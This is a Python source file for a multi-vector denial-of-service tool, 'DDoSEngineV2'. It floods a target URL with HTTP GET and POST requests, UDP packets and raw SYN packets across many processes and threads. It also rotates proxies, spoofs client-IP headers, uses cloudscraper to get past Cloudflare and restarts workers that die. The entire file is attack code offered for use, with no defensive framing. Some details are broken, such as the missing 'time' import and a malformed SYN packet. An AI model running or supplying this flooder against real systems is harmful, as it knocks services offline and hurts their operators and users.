import asyncio
import aiohttp
import random
import ssl
import socket
import struct
import threading
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import requests
import cloudscraper
from curl_cffi import requests as curl_requests

class DDoSEngineV2:
    def __init__(self, target_url, proxy_list=None, thread_count=50000):
        self.target_url = target_url
        self.proxy_list = proxy_list or []
        self.running = multiprocessing.Value('b', True)
        self.thread_count = thread_count
        self.host = target_url.replace('https://', '').replace('http://', '').split('/')[0]
        self.port = 443 if 'https' in target_url else 80
        
        # calculate optimal threads per CPU core
        self.cores = multiprocessing.cpu_count()
        self.threads_per_core = thread_count // self.cores if thread_count > self.cores else 100
        self.processes = min(self.cores, 16)  # max 16 processes
        
    def get_random_proxy(self):
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            return {'http': proxy, 'https': proxy}
        return None
    
    async def http_flood(self, session, task_id):
        """HTTP flood with random paths and headers"""
        paths = ['/', '/index.php', '/api/v1', '/wp-admin', '/.env', '/config', '/backup', '/login', '/search', 
                 '/product', '/cart', '/checkout', '/api/users', '/api/data', '/download', '/upload', '/images']
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
        ]
        referers = ['https://google.com', 'https://bing.com', 'https://yahoo.com', self.target_url]
        
        while self.running.value:
            path = random.choice(paths)
            url = self.target_url.rstrip('/') + path
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'TE': 'Trailers',
                'Referer': random.choice(referers),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.0",
                'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            }
            try:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                    pass
            except:
                pass
            await asyncio.sleep(0)  # yield control
    
    async def post_flood(self, session, task_id):
        """POST flood with random data"""
        while self.running.value:
            data = {
                'data': 'x' * random.randint(100, 50000),
                'json': {'id': random.randint(1, 999999), 'data': 'x' * random.randint(10, 1000)},
                'file': ('file.txt', b'x' * random.randint(1000, 10000))
            }
            headers = {'Content-Type': random.choice(['application/x-www-form-urlencoded', 'multipart/form-data', 'application/json'])}
            try:
                async with session.post(self.target_url, data=random.choice(list(data.values())), headers=headers, timeout=2) as resp:
                    pass
            except:
                pass
            await asyncio.sleep(0)
    
    def udp_flood_worker(self):
        """UDP flood - raw packets for a worker thread"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ip = socket.gethostbyname(self.host)
            packet = random._urandom(65500)
            while self.running.value:
                for _ in range(100):
                    sock.sendto(packet, (ip, self.port))
        except:
            pass
    
    def syn_flood_worker(self):
        """SYN flood worker"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            ip = socket.gethostbyname(self.host)
            while self.running.value:
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(1, 4294967295)
                packet = struct.pack('!HHLLBBHHH', src_port, self.port, seq_num, 0, 5 << 4, 2, 8192, 0, 0)
                sock.sendto(packet, (ip, self.port))
        except PermissionError:
            pass  # needs root but we ignore
    
    def http_thread_worker(self, worker_id):
        """Thread worker for HTTP requests (synchronous)"""
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False})
        while self.running.value:
            try:
                scraper.get(self.target_url, timeout=2, verify=False)
            except:
                pass
    
    async def run_async_attack(self, attack_type='http', threads_per_process=1000):
        """Run async attack in one process"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(
            ssl=ssl_context, 
            limit=0, 
            limit_per_host=0,
            force_close=True,
            enable_cleanup_closed=True,
            ttl_dns_cache=0
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for i in range(threads_per_process):
                if attack_type == 'http':
                    task = asyncio.create_task(self.http_flood(session, i))
                elif attack_type == 'post':
                    task = asyncio.create_task(self.post_flood(session, i))
                tasks.append(task)
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def run_process_attack(self, attack_type='http', threads=1000):
        """Run async attack in a single process (called by multiprocessing)"""
        asyncio.run(self.run_async_attack(attack_type, threads))
    
    def run_udp_syn_process(self):
        """Run UDP/SYN attack in one process with many threads"""
        threads = []
        # UDP workers
        for _ in range(self.threads_per_core // 2):
            t = threading.Thread(target=self.udp_flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        # SYN workers
        for _ in range(self.threads_per_core // 2):
            t = threading.Thread(target=self.syn_flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        # HTTP thread workers
        for _ in range(self.threads_per_core):
            t = threading.Thread(target=self.http_thread_worker, args=(_,))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    
    def start_full_attack(self, attack_type='http'):
        """Start attack using multiprocessing for 1M+ threads"""
        processes = []
        
        if attack_type == 'udp_syn':
            for _ in range(self.processes):
                p = multiprocessing.Process(target=self.run_udp_syn_process)
                p.start()
                processes.append(p)
        else:
            threads_per_process = self.thread_count // self.processes
            for _ in range(self.processes):
                p = multiprocessing.Process(target=self.run_process_attack, args=(attack_type, threads_per_process))
                p.start()
                processes.append(p)
        
        # monitor processes
        while self.running.value:
            for p in processes:
                if not p.is_alive():
                    # restart dead process
                    if attack_type == 'udp_syn':
                        new_p = multiprocessing.Process(target=self.run_udp_syn_process)
                    else:
                        new_p = multiprocessing.Process(target=self.run_process_attack, args=(attack_type, threads_per_process))
                    new_p.start()
                    processes.remove(p)
                    processes.append(new_p)
            time.sleep(5)
        
        # cleanup
        for p in processes:
            p.terminate()
            p.join()
    
    def stop(self):
        self.running.value = False